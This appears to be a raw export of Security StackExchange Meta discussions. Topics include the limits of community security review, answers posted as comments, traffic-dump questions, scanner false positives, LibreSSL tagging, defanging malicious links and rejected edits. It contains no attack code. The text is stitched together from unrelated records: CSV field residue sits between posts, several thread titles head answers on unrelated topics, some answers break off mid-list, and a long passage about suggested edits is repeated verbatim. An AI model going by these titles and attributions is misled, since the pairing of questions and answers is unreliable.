<p><strong>We don't know enough to provide insight.</strong></p>

<p>This is a good thing.</p>

<p>We're internet strangers.</p>

<p>Some of us are malicious.</p>

<p>We're all extremely curious, and like to pick apart interesting puzzles.  That includes obscure security practices, weirdly formatted data, and seeing if, since our userID is 41, whether or not we can see user 42's data without authenticating as that user.</p>

<p>You don't want us to know the minute details of your system, unless you have drawn up a pen-testing contract and have paid us.</p>

<p>If you do want many eyes on your system, it should be open source. If it's academically significant, you should submit it to a journal. (You don't have to be part of academia to submit papers to a journal, but it helps.)</p>

<p>You don't want us, in the course of answering questions for fake internet points, to poke at your system too hard.  For the most interesting questions, we might spend a few hours on the problem.  Most of us are interested in spending a few minutes, then going to the next source of fake internet points.</p>

<p>There is some small measure of fame for us, for coming up with great answers.  It's not going to pay our bills, though. It won't put food on our tables.  Either we find a hole in a few minutes of poking, or we don't...  Keep in mind that, in the case of security critical systems, many thousands of person-hours are spent on the topic, which changes our answer from ""probably insecure"" to ""might not be insecure.""  If you're lucky, we might spend dozens of person-hours on your system, across our whole community.</p>

<p>If we can't, within a few hours, say that ""yes, this is definitely insecure, and a more secure way to do this is..."", then we're the wrong people to answer your question.</p>

<p>Keep in mind, though, that you've already taken the first step in the right direction.  You are already concerned about the security of  your system.  Feel free to stop by chat; we'll generally point people in the right direction, or at least give you enough jargon so they can find the directions you need to go yourself.</p>

<p>If you'd like help in coming up with a way to reword your question, come visit us on Meta.</p>

<p>If you need enough of our sweet fake internet points to post in Meta, lurk around here for a bit and help people out. We may be gruff, and our comments may sometimes come across as criticism, but we're honestly happy to see more people take an interest in security.</p>

Short answers in comments,"<p>I see 3 problems with your proposal:</p>

<ol>
<li><p>The danger is that someone won't post an actual answer because it is already contained in a well-written comment. Or when someone says the same thing, it is seen as plagiarism. </p></li>
<li><p>Comments cannot be downvoted, which means that comments then have to be responded to when the commenter is wrong or unhelpful, which can end up in a long thread. Answers help to separate the threads. </p></li>
<li><p>Comments cannot be accepted, which means that subsequent visitors have to decypher comment threads.</p></li>
</ol>

<p>I only ""answer"" in comments in order to:</p>

<ol>
<li>Trigger a response to see if my approach is what they are looking for (and often I will delete my comment and convert it into an answer). It's a ""strawman"" approach.</li>
<li>Provide quick help when the question is off-topic. Off-topic questions without answers get cleaned up. If I submit an answer, and it gets upvoted, the system won't clean it up. It's my way of helping without polluting the question pool.</li>
</ol>

<p>Instead, we should just be more tolerant of short answers. They accomplish the same thing as a comment but have the benefits above. Post a quick answer and come back later to flesh it out. We typically don't quickly delete correct answers that just need fleshing out. I've been experimenting with really short answers recently. </p>
",<discussion><comments>,7,,231
Short answers in comments,"<p>I am a relatively new user to stackexchange in general and my opinion is that actual answers are better than comment answers in more than just one way. Although good information can come from comments, it doesn't fully answer the question as you said and if the question-asker follows up with that comment it can be ambiguous whether or not the question was resolved. Most of the time where I see an answer in the comment no actual answer is made.</p>

<p>For new users it can also feel weird seeing a good number of answers in comments, but not being able to participate at all. Maybe participation could be fostered by having comments be the lower barrier to entry before giving an answer, but for other reasons stackexchange just doesn't work that way.</p>

<p>In general, comments aren't made for discussion in part because there aren't threaded replies. Trying to track answers through the comments is almost similar to a forum-post where the answers are out of order and harder to track. Stackexchange was built to avoid scenarios like these!</p>

<blockquote>
  <p>Sometimes people respond better to a quick sentence that gives them some phrases to look up, rather than a self-contained answer that spells everything out.</p>

<p>As you mention here, a quick sentence to give them some phrases to look up is how comments should be used (from what I've read). Making comments to clarify the question and let the user do their own research is a good use of comments. </p>

<p>So, yes, the close reason can be applied in a variety of different situations, and one closed question might not look like another.</p>

Can anyone look into wireshark logs and say if anything suspicious?,"<p>Depends on the question. In general, I would say:</p>
<ul>
<li>&quot;Here's a traffic dump. Notice anything strange?&quot; Will be closed as &quot;needs focus&quot;.</li>
<li>&quot;Here's some relevant subset of trafic. I suspect X. Is that correct?&quot; Probably OK question!</li>
<li>&quot;Here's some small subset of trafic that I don't understand. I expected X but got Y. What is going on here?&quot; Probably OK as long as there is a security angle to it.</li>
</ul>
<p>The key is that you need to focus on something specific, and not just a big dump of traffic. The goal is for questions here to be useful for more than just the person asking them. Since your traffic is unique to you nobody else will benefit from a general analysis.</p>
<p>If your goal is &quot;to find any backdoor/rootkit by using wireshark without knowing anything&quot; it is not specific enough to ask here, I'm afraid.</p>

Does the highlighting library support ASN.1?,"<p>I'm gonna give an answer counter to @schroeder's. This will be a ramble, but it'll come back, bear with me.</p>
<p>Programmers get a compile or runtime error they don't understand. What do they do? They type the error code or text into google, hit the first StackOverflow post that seems to be an exact match, scroll to the top answer, say to themselves <em>&quot;Make the class abstract? Alright I guess ... Hey! It worked!&quot;</em> and move on with their lives without having actually learned anything and likely made their code more brittle. I've done it. You've done it.</p>
<p>I worry that with security scanner results, the same behaviour will make people go <em>&quot;security.stackexchange says it's a false positive. Great!&quot;</em>.</p>
<p><strong>This Is Dangerous!</strong></p>
<p><strong>This will lead people to ignore real security issues in their products.</strong></p>
<p>Security is subtle and tricky and highly dependant on the exact behaviour of the web app in front of you. The correct way to triage a security scan report is to pull out nmap or OWASP ZAP or whatever and try to manually reproduce the result until you're convinced that either the app needs fixing, or the scanner is wrong. If you don't have the skill to do this; then hire someone who does, throw the report back to the scanner vendor, or the app vendor, or something. Basically you're not qualified to analyze the output of this scanner; go find someone who is. Random people on the internet without access to the server you're testing <em>cannot</em> give you a complete answer. A detailed answer about the same error in a different web app <em>does not</em> carry over to yours.</p>

<p>My vote is to do one of:</p>
<ol>
<li>outright close the question (maybe this needs a community-specific close reason?)</li>
<li>Make it <em>very clear</em> on answers that this advice is unlikely to generalize to &quot;similar situations&quot;. This will likely need community effort to put disclaimers at the top of top answers.</li>
<li>Keep to general education-type answers: <em>&quot;Here's what the tool thinks it found&quot;</em>, or <em>&quot;Here's how you can re-test that manually&quot;</em>, but stop short of declaring a finding Real or False Positive.</li>

Does the highlighting library support ASN.1?,"<p>There's no way to add color or anything fancy on this website, but you can use some basic markup, even in formatted code, by using <code>&lt;pre&gt;</code> instead of four leading spaces.

Should LibreSSL have a tag?,"<p>I have no domain knowledge here, but my leanings are towards using one tag.</p>
<p>If the majority of Libre SSL questions are also Open SSL questions, they should have the same tag so they can be easily searched. If there were two tags, a lot of common issues might be tagged with Libre SSL, thereby hiding them. It is hard to get people to use tags in a consistent manner when the delimination is a bit tricky.</p>
<p>But are we to take this route, it should be made &quot;official&quot; in the tag wiki, as you say, and perhaps with an alias tag as well.</p>

<p>While they aim to be compatible with OpenSSL, they've added some features not available in OpenSSL, and removed deprecated ciphers. It's simply not OpenSSL anymore, and <del>in a lot of scenarios</del> I can think of situations where the difference is relevant.</p>

<p>I'm not sure if the moderator should have done that. Moderators don't have the ability to retract other user's close votes, so I don't think they should remove the automated comment that comes with it. That said, I completely disagree with your close reason.</p>
<blockquote>
<p>deleted comments expressing my view that the behavior is malicious</p>
</blockquote>
<p>Unfortunately, I didn't see the deleted comments, so I can't say anything. In general though, comments are for asking for clarification or adding information. Anything else is noise, and you can't complain if it gets cleaned up. However, I see that as of now, you do have <a href=""https://security.stackexchange.com/questions/254257/how-can-i-prove-to-users-that-my-obfuscated-code-is-not-malicious-without-unobfu/254277#comment521989_254257"">one comment expressing your distaste for OPs work</a>, so I'm not sure why you're complaining anyways.</p>
<blockquote>
<p>deleted an answer I'd written characterizing the behavior as malicious</p>
</blockquote>
<p>Again, since I didn't read the answer, I can't say for certain, but characterizing the behavior as malicious doesn't answer the question asked, so the deletion seems justified. The intended users of the OP's code are website administrators, and  as described, the code isn't malicious from their perspective. Since the OP is asking how <em>his</em> users can trust the code, the fact that the code may be considered malicious by people surfing the web is besides the point.</p>
<hr />
<p>Now to answer what I believe is your implicit complaint: You want to close the question because you consider what the OP is doing as malicious.</p>
<p>Well, the community consensus on this issue is that <em>we <a href=""https://security.meta.stackexchange.com/questions/14/should-we-accept-question-about-making-exploit-or-building-malware/"">don't</a> <a href=""https://security.meta.stackexchange.com/questions/2532/is-it-our-responsibility-to-question-the-motive-behind-a-question"">care</a> <a href=""https://security.meta.stackexchange.com/a/906/235964"">about</a> the color of the OP's hat</em>. As long they have asked a proper on-topic question, we are fine with it. Blackhat content can be just as useful to defenders, and vice-versa. And not everybody agrees on what is malicious and what is not anyways.</p>

<li><p>Absolutely do codify the link to prevent accidental clicks. (I have zero fine motor skills and my phone is tiny.)</p>
</li>
<li><p>Mask the link if you feel like it, but no harm done if you don't bother.</p>
</li>
<li><p>Don't go looking for questions with unmasked links and make unecesary edits to them.</p>
</li>
<li><p>If someone does edit your question to mask the link anyway, probably just let it be unless you have strong feelings about it.</p>

<p>Codyfying is important. Masking feels like a non issue. Or at least thats my two cents.</p>

Character replaced with boxes in edit view?,"<p>I've seen the hxxp scheme being used a lot in the security community (f.e. when sharing malware/phishing websites on Twitter), so I'm personally used to it.</p>

<p>But I fully agree with Anders's answer: the most important thing to do is prevent anyone to accidentally click such a link. Unlike Twitter, the markup used on the StackExchange network allows us to reach that goal in multiple ways, so feel free to choose the one you prefer.</p>

Character replaced with boxes in edit view?,"<p>If the spam addresses are important to the question, you can replace the addresses with images showing the addresses.  For example, your original question didn't need to list the exact addresses.  However, this question relies on seeing the <em>volume</em> of addresses as a part of the meta-question, so they're more relevant.</p>
<p>In many cases, addresses of spam sites are intentionally included in as many locations as possible as a part of link optimization.  Any time an address can be associated with a reputable, non-spam, non-porn address can add to its &quot;legitimacy&quot; when ranking the address for quality. Try to never include them directly.</p>

",<discussion><answers><deleted-answers>,2,,279
Why was my answer to this question about Adobe Illustrator files deleted?,"<p>I don't think this is only about me, but I have rejected and improved at least one of your edits before. I don't remember which one it was, but it had some bad elements and minor good elements (which I took over, I think it was stuff like capitalizing i in &quot;i am&quot;).</p>
<p>I generally <em>accept and edit</em>:</p>
<ul>
<li>If I would also approve the edit by itself, that is, without wanting to undo some of the changes in a subsequent edit.</li>
<li>If there are multiple good changes, or a change that clearly took time (e.g., I recently saw someone transcribing a screenshot of code, perhaps for vision-impaired users or indexableness), then I will simply fix any accidentally introduced mistakes instead of rejecting. In this case, the edit has merit even if it introduces an issue.</li>
<li>To be more welcoming to a new user who is still learning and being onboarded. They could see what I added on top and learn from that, or even if not, they're not immediately discouraged so hopefully they'll later take rejections in stride and notice what works and what doesn't.</li>
</ul>
<p>Given your constant stream of edits, you clearly know how the system works already, so then I choose to <em>reject and edit</em> insubstantial edits with regressions.</p>
<p>I try to review quite carefully, to see if really no meaning is lost in rephrasings, so <strong>it's a bit irksome to get a stream of insubstantial edits</strong>. Things like searching the site for &quot;thank you&quot;s and removing those (<a href=""https://security.stackexchange.com/review/suggested-edits/180344"">1</a>, <a href=""https://security.stackexchange.com/review/suggested-edits/180327"">2</a>), or removing an unnecessary comma somewhere, feels like karma farming and wasting review time.</p>
<p>(Note that you get 5× as much karma from a single upvote. Posting answers is much more effective if that's what you're going for.)</p>
<p>I don't think you get a notification upon rejection so you might not have seen those, but whenever I think it's not absolutely obvious why something was rejected, I leave a comment with my reasoning. Unfortunately the field has space for only a handful of words so it's not always complete. Examples:</p>
<ul>
<li><p><a href=""https://security.stackexchange.com/review/suggested-edits/180468"">https://security.stackexchange.com/review/suggested-edits/180468</a> Reject reason that I wrote:</p>
<blockquote>
<p>monospace isn't for quotes; quotes are for quotes. The original was correct.Stop submitting style changes + breaking things alongside negligible fixes</p>
</blockquote>
<p>The changes you made:</p>
<ul>
<li>&quot;To search the internet&quot; is something I've heard commonly enough, I am no English native speaker but this phrasing is either correct or, at least, not misunderstandable and common enough that it doesn't trip me up when reading. You inserted an &quot;on&quot; (&quot;to search on the internet&quot;) which is an improvement because this sounds more correct, but it seems frivolous.</li>
<li>You replaced quoted words with monospace. Quotations are literally <a href=""https://en.wikipedia.org/wiki/Quotation_mark"" rel=""nofollow noreferrer"">what quote symbols are for</a>. Monospace can be (1) a stylistic choice (such as to make something look like it was written on a typewriter), (2) makes individual characters more clear when that is important (such as when programming, e.g.: print(&quot;'o clock&quot;) vs. <code>print(&quot;'o clock&quot;)</code>), or (3) makes it easier to align things like numbers in a ledger or in ASCII art (<a href=""https://en.wikipedia.org/wiki/Monospaced_font"" rel=""nofollow noreferrer"">Wikipedia</a>; <a href=""https://www.imaginated.com/design-glossary/what-is-monospaced-font/#What_are_Monospaced_Fonts_Used_For"" rel=""nofollow noreferrer"">Imaginated</a>). Quoting words is none of those purposes, and this isn't the only edit where you've put random things in monospace. <strong>It seems you like this style, and you should feel free to use it in your own questions, answers, or comments even if it seems incorrect to me, but don't force it into other people's texts.</strong> (This is not the only style choice you introduce in other people's posts.)</li>
<li>&quot;[search] to find more resources&quot; was replaced with &quot;[search] for more resources&quot;. To me this carries 100% the same meaning, there is no point to this change.</li>
<li>There are no other changes.</li>
<li>Conclusion: the edit introduces a (imo incorrect) stylistic change of your preference and has no other benefits. Reject.</li>
</ul>
</li>
<li><p><a href=""https://security.stackexchange.com/review/suggested-edits/180363"">https://security.stackexchange.com/review/suggested-edits/180363</a> You described the edit as &quot;Fixed grammar&quot;. Reject reason:</p>
<blockquote>
<p>stylistic choices and oxford commas are not grammar mistakes...</p>
</blockquote>
<p>The changes made include</p>
<ul>
<li>changing a semicolon to a full stop (stylistic choice mainly, or so it seems to me)</li>
<li>changing a &quot;[I heard this and that], so I figured [xyz]&quot; to &quot;[I heard this and that]. So I figured [xyz]&quot;. The original sounds better to me.</li>
<li>removing an oxford comma, again just a stylistic choice</li>
</ul>
</li>
<li><p>In <a href=""https://security.stackexchange.com/review/suggested-edits/180539"">this suggestion</a> I just chose the &quot;insubstantial&quot; template as reject reason because that ought to be obvious to anyone. Replacing the word &quot;ONLY&quot; with a boldface &quot;<strong>only</strong>&quot; is no substantial improvement to the post: it does not make it even slightly easier to read, it carries the same meaning and stands out just as much. There is also a comma inserted in a place where there was no possible confusion of meaning (perhaps technically an improvement, but not substantial).</p>
</li>
<li><p>Similar with <a href=""https://security.stackexchange.com/review/suggested-edits/180492"">this one</a>: capitalizing a product name in the title, when the product name cannot be confused with another word -- moreover, the word is <a href=""https://en.wikipedia.org/wiki/Hashcat"" rel=""nofollow noreferrer"">commonly written all-lowercase!</a> -- edit: and that <a href=""https://security.stackexchange.com/questions/261251/can-you-use-an-fpga-with-hashcat"">you also wrote lowercase in your own question title!</a></p>
</li>
<li><p>The original author chose to <a href=""https://security.stackexchange.com/review/suggested-edits/180361"">reject this suggestion</a> as insubstantial as well. Here, too, you introduce a stylistic choice: Capitalizing words after a colon. (There are rules regarding this, but it's partially also just a style people prefer.) If you have an important edit (such as fixing a syntax error in meant-to-be-copied code), which this is not, and need to get over the character threshold to be allowed to submit it, then you could add <code>&lt;!-- a comment tag --&gt;</code> instead instead of introducing random changes elsewhere.</p>
</li>
</ul>
<p>With &quot;reject and edit&quot;, there is no input field for the reject reason, unfortunately. No custom reason can be given, but also no template reason can be selected. This might also lead to the idea that people are rejecting and then 'stealing' (taking credit for) your edit.</p>
<p>I'm also not sure if you saw <a href=""https://security.meta.stackexchange.com/questions/3502/someone-is-stealing-my-edits#comment8825_3503"">this comment from @nobody</a> which might also be (part of) the cause of the confusion: &quot;When someone rejects and edits, they don't get any rep for it. So no one is stealing your edits for the reps, they probably just think your edit is not good enough/complete.&quot;</p>
<p>I hope this helps to understand reasons that people might have for rejecting edits.</p>

<p>I don't think you get a notification upon rejection so you might not have seen those, but whenever I think it's not absolutely obvious why something was rejected, I leave a comment with my reasoning.

<li><p><a href=""https://security.stackexchange.com/review/suggested-edits/180468"">https://security.stackexchange.com/review/suggested-edits/180468</a> Reject reason that I wrote:</p>
<blockquote>
<p>monospace isn't for quotes; quotes are for quotes. The original was correct.Stop submitting style changes + breaking things alongside negligible fixes</p>
</blockquote>
<p>The changes you made:</p>
<ul>
<li>&quot;To search the internet&quot; is something I've heard commonly enough, I am no English native speaker but this phrasing is either correct or, at least, not misunderstandable and common enough that it doesn't trip me up when reading. You inserted an &quot;on&quot; (&quot;to search on the internet&quot;) which is an improvement because this sounds more correct, but it seems frivolous.</li>
<li>You replaced quoted words with monospace. Quotations are literally <a href=""https://en.wikipedia.org/wiki/Quotation_mark"" rel=""nofollow noreferrer"">what quote symbols are for</a>. Monospace can be (1) a stylistic choice (such as to make something look like it was written on a typewriter), (2) makes individual characters more clear when that is important (such as when programming, e.g.: print(&quot;'o clock&quot;) vs. <code>print(&quot;'o clock&quot;)</code>), or (3) makes it easier to align things like numbers in a ledger or in ASCII art (<a href=""https://en.wikipedia.org/wiki/Monospaced_font"" rel=""nofollow noreferrer"">Wikipedia</a>; <a href=""https://www.imaginated.com/design-glossary/what-is-monospaced-font/#What_are_Monospaced_Fonts_Used_For"" rel=""nofollow noreferrer"">Imaginated</a>). Quoting words is none of those purposes, and this isn't the only edit where you've put random things in monospace. <strong>It seems you like this style, and you should feel free to use it in your own questions, answers, or comments even if it seems incorrect to me, but don't force it into other people's texts.</strong> (This is not the only style choice you introduce in other people's posts.)</li>
<li>&quot;[search] to find more resources&quot; was replaced with &quot;[search] for more resources&quot;. To me this carries 100% the same meaning, there is no point to this change.</li>
<li>There are no other changes.</li>
<li>Conclusion: the edit introduces a (imo incorrect) stylistic change of your preference and has no other benefits. Reject.</li>

</li>
<li><p><a href=""https://security.stackexchange.com/review/suggested-edits/180363"">https://security.stackexchange.com/review/suggested-edits/180363</a> You described the edit as &quot;Fixed grammar&quot;. Reject reason:</p>
<blockquote>
<p>stylistic choices and oxford commas are not grammar mistakes...</p>
</blockquote>
<p>The changes made include</p>
<ul>
<li>changing a semicolon to a full stop (stylistic choice mainly, or so it seems to me)</li>
<li>changing a &quot;[I heard this and that], so I figured [xyz]&quot; to &quot;[I heard this and that]. So I figured [xyz]&quot;. The original sounds better to me.</li>
<li>removing an oxford comma, again just a stylistic choice</li>
</ul>
</li>
<li><p>In <a href=""https://security.stackexchange.com/review/suggested-edits/180539"">this suggestion</a> I just chose the &quot;insubstantial&quot; template as reject reason because that ought to be obvious to anyone. Replacing the word &quot;ONLY&quot; with a boldface &quot;<strong>only</strong>&quot; is no substantial improvement to the post: it does not make it even slightly easier to read, it carries the same meaning and stands out just as much. There is also a comma inserted in a place where there was no possible confusion of meaning (perhaps technically an improvement, but not substantial).</p>
</li>
<li><p>Similar with <a href=""https://security.stackexchange.com/review/suggested-edits/180492"">this one</a>: capitalizing a product name in the title, when the product name cannot be confused with another word -- moreover, the word is <a href=""https://en.wikipedia.org/wiki/Hashcat"" rel=""nofollow noreferrer"">commonly written all-lowercase!</a> -- edit: and that <a href=""https://security.stackexchange.com/questions/261251/can-you-use-an-fpga-with-hashcat"">you also wrote lowercase in your own question title!</a></p>
</li>
<li><p>The original author chose to <a href=""https://security.stackexchange.com/review/suggested-edits/180361"">reject this suggestion</a> as insubstantial as well. Here, too, you introduce a stylistic choice: Capitalizing words after a colon. (There are rules regarding this, but it's partially also just a style people prefer.) If you have an important edit (such as fixing a syntax error in meant-to-be-copied code), which this is not, and need to get over the character threshold to be allowed to submit it, then you could add <code>&lt;!-- a comment tag --&gt;</code> instead instead of introducing random changes elsewhere.</p>
</li>
</ul>
<p>With &quot;reject and edit&quot;, there is no input field for the reject reason, unfortunately. No custom reason can be given, but also no template reason can be selected. This might also lead to the idea that people are rejecting and then 'stealing' (taking credit for) your edit.</p>
<p>I'm also not sure if you saw <a href=""https://security.meta.stackexchange.com/questions/3502/someone-is-stealing-my-edits#comment8825_3503"">this comment from @nobody</a> which might also be (part of) the cause of the confusion: &quot;When someone rejects and edits, they don't get any rep for it. So no one is stealing your edits for the reps, they probably just think your edit is not good enough/complete.&quot;</p>
